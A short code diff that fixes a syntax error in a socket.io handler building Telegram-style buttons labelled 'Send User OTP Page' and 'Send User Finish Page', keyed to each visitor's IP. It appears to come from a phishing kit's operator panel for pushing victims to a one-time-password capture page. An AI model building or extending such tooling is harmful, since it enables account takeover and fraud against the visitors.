@@ -227,7 +227,7 @@ io.on('connection', (socket, req) => {
             reply_markup: {
                 inline_keyboard: [
                     [{ text: 'Send User OTP Page', callback_data: `good:${userIP}`}],
-                    [{ text: 'Send User Finish Page't ', callback_data: `bad:${userIP}` }]
+                    [{ text: 'Send User Finish Page', callback_data: `bad:${userIP}` }]
                 ]
             }
         };
